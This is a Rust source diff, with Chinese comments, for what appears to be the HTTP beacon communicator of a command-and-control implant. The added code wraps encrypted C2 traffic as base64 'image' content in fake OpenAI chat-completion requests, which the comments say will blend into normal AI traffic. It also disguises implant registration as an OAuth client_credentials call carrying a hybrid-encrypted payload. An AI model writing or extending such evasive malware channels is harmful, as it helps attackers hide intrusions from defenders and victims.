@@ -26,6 +26,8 @@ pub struct RegisterOutcome {
     pub profile: Option<ProfileTransform>,
     /// 会话 token（后续请求放入密文信封）。
     pub session_token: Option<String>,
+    /// 服务端 RSA 公钥（SPKI DER b64，构建注入）。
+    pub server_public_key: String,
     /// 心跳间隔（毫秒，profile 或服务端下发值；0 = 保持构建时值）。
     pub heartbeat_interval_ms: u64,
     /// 抖动百分比（0 = 保持构建时值）。
@@ -40,6 +42,8 @@ pub struct HttpCommunicator {
     entry_path: String,
     profile: Option<ProfileTransform>,
     session_token: Option<String>,
+    /// 服务端 RSA 公钥（构建注入）：注册/协商混合加密用；空 = 旧式明文/单入口注册。
+    server_public_key: String,
     /// beacon secret（HMAC 假签名的 key；注册时保存）。
     beacon_secret: String,
     ua_index: std::sync::atomic::AtomicUsize,
@@ -66,6 +70,7 @@ impl HttpCommunicator {
             entry_path: register_path.to_string(),
             profile: None,
             session_token: None,
+            server_public_key: String::new(),
             beacon_secret: String::new(),
             ua_index: std::sync::atomic::AtomicUsize::new(0),
         }
@@ -82,6 +87,11 @@ impl HttpCommunicator {
             self.entry_path = profile.entry_path.clone();
         }
         self.profile = Some(profile);
+    }
+
+    /// 设置服务端 RSA 公钥（构建注入）：注册混合加密用。
+    pub fn set_server_public_key(&mut self, key: String) {
+        self.server_public_key = key;
     }
 
     /// 构建时注入的请求样式（UA 列表/附加头/路径后缀）。
@@ -265,6 +275,8 @@ impl HttpCommunicator {
             .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));
 
         let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
+        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求，海量正常流量）
+        let content = format!("data:image/jpeg;base64,{}", cipher_b64);
         let model = if models.is_empty() {
             "gpt-4o-mini"
         } else {
@@ -273,7 +285,8 @@ impl HttpCommunicator {
         let body = serde_json::json!({
             "model": model,
             "stream": true,
-            "messages": [{"role": "user", "content": cipher_b64}]
+            "messages": [{"role": "user", "content": content}],
+            "user": self.session_token.clone().unwrap_or_default()
         });
 
         let auth: String = {
@@ -360,9 +373,29 @@ impl HttpCommunicator {
             if has_session_key { "true" } else { "false" }
         );
 
-        // 无 beacon secret（开发/明文部署环境）：走旧端点明文注册。
-        // 有 secret：走单入口密文注册（预会话密钥）。
-        let (status, resp_body) = if beacon_secret.is_empty() {
+        // 有服务端公钥：走 /api/v1/session OAuth 风格混合加密注册。
+        // 无公钥（dev 直连/旧构建）：无 secret 时明文旧端点；有 secret 时单入口预会话加密。
+        let (status, resp_body) = if !self.server_public_key.is_empty() {
+            let (enc_key, cipher_body) =
+                libra_crypto::hybrid_encrypt(&reg_json, &self.server_public_key)
+                    .map_err(|e| format!("hybrid encrypt: {e}"))?;
+            let body = format!(
+                r#"{{"grant_type":"client_credentials","client_id":"{}","client_secret":"{}"}}"#,
+                cipher_body, enc_key
+            );
+            let resp = self
+                .client
+                .post(format!("{}{}", self.server_url, "/api/v1/session"))
+                .header("Content-Type", "application/json")
+                .body(body)
+                .send()
+                .await
+                .map_err(|e| e.to_string())?;
+            let status = resp.status().as_u16();
+            let text = resp.text().await.map_err(|e| e.to_string())?;
+            (status, text)
+        } else if beacon_secret.is_empty() {
+            // 明文注册（无 secret 且无公钥的开发环境）：旧端点
             let resp = self
                 .client
                 .post(self.register_url())
@@ -434,6 +467,7 @@ impl HttpCommunicator {
             session_key,
             profile,
             session_token,
+            server_public_key: self.server_public_key.clone(),
             heartbeat_interval_ms,
             jitter_percent,
         })
